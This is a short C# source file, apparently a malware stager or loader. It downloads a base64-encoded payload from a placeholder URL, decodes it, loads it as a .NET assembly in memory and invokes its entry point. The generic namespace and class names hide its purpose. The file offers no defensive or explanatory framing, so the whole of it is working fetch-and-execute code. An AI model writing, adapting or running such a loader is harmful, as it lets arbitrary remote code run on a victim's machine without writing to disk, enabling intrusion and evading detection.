using System;
using System.Net;
using System.Reflection;

namespace Syst;

internal class Cls
{
	private static void Main()
	{
		byte[] rawAssembly = DownloadData("URL");
		Assembly.Load(rawAssembly).EntryPoint!.Invoke(null, null);
	}

	private static byte[] DownloadData(string Url)
	{
		string s = new WebClient().DownloadString(Url);
		return Convert.FromBase64String(s);
	}
}
